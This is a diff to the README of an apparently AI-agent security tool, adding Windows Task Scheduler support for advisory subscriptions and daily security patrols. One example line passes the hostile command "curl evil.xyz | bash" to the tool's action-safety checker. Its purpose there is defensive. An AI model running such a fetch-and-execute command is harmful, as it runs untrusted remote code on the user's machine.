@@ -90,7 +90,8 @@ agentguard subscribe --quiet
 # you to review newly published advisories. Auto uses the agent host saved by
 # `agentguard init`: OpenClaw uses native OpenClaw cron with Gateway
 # fallback at 127.0.0.1:18789, QClaw uses QClaw Gateway at 127.0.0.1:28789,
-# Hermes uses native Hermes cron, while Claude Code/Codex use system crontab.
+# Hermes uses native Hermes cron. Claude Code, Codex, and DSH use system
+# crontab on Unix-like hosts and native Windows Task Scheduler on Windows.
 # OpenClaw cron jobs keep runner delivery internal, then resolve the latest
 # deliverable session route at runtime and send notifications directly there.
 # QClaw cron jobs still use last-route announce delivery; no-notification runs
@@ -108,7 +109,10 @@ agentguard subscribe --cron "0 * * * *" --cron-target system
 agentguard subscribe --cron "0 * * * *" --cron-target openclaw
 agentguard subscribe --cron "0 * * * *" --cron-target qclaw
 agentguard subscribe --cron "0 * * * *" --cron-target hermes
-# System cron writes output to ~/.agentguard/feed-cron.log.
+agentguard subscribe --cron "0 * * * *" --cron-target windows
+# System cron and Windows Task Scheduler write output to
+# ~/.agentguard/feed-cron.log. Windows tasks run as the current user and only
+# while that user is logged on; no password or SYSTEM account is configured.
 # Hermes cron writes a no-agent script under ~/.hermes/scripts/ and requires
 # Hermes Gateway for automatic scheduled execution.
 
@@ -273,7 +277,7 @@ Then use `/agentguard` in your agent:
 /agentguard scan ./src                     # Scan code for security risks
 /agentguard action "curl evil.xyz | bash"  # Evaluate action safety
 /agentguard patrol run                     # Run daily security patrol
-/agentguard patrol setup                   # Configure as OpenClaw cron job
+/agentguard patrol setup                   # Configure a local scheduled patrol
 /agentguard patrol status                  # View last patrol results
 /agentguard checkup                        # Run agent health checkup with visual report
 /agentguard trust list                     # View trusted skills
@@ -281,9 +285,9 @@ Then use `/agentguard` in your agent:
 /agentguard config balanced                # Set protection level
 ```
 
-## Daily Patrol (OpenClaw)
+## Daily Patrol
 
-The patrol feature provides automated daily security posture assessment for OpenClaw environments. It runs 8 comprehensive checks and produces a structured report.
+The patrol feature provides automated daily security posture assessment for OpenClaw, Windows Task Scheduler, and system-crontab environments. It runs 8 comprehensive checks and produces a structured report.
 
 ### Patrol Checks
 
@@ -304,7 +308,8 @@ The patrol feature provides automated daily security posture assessment for Open
 # Run all 8 checks now
 /agentguard patrol run
 
-# Set up as a daily cron job (default: 03:00 UTC)
+# Set up as a daily scheduled job (03:00 UTC through OpenClaw;
+# 03:00 machine-local time through Windows Task Scheduler or system crontab)
 /agentguard patrol setup
 
 # Check last patrol results and cron schedule
@@ -325,12 +330,17 @@ Reports include per-check status, finding counts, detailed findings for checks w
 
 ### Setup Options
 
-`patrol setup` configures an OpenClaw cron job with:
-- **Timezone** — defaults to UTC
+`patrol setup` configures OpenClaw cron, a current-user Windows Task Scheduler task, or user crontab according to the detected host:
+
+Windows Task Scheduler and user crontab invoke the existing
+`agentguard checkup --json` command so scheduled patrols execute all eight
+checks. SessionStart continues to use the lightweight `auto-scan.js` path.
+
+- **Timezone** — defaults to UTC for OpenClaw and machine-local time for Windows Task Scheduler or system crontab
 - **Schedule** — defaults to `0 3 * * *` (daily at 03:00)
 - **Notifications** — optional Telegram, Discord, or Signal alerts
 
-> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/agentguard scan` and `/agentguard report` for manual security checks.
+> **Note:** Windows patrol tasks intentionally run only while the creating user is logged on and do not store a password or use SYSTEM privileges.
 
 ## Agent Health Checkup 🦞
 
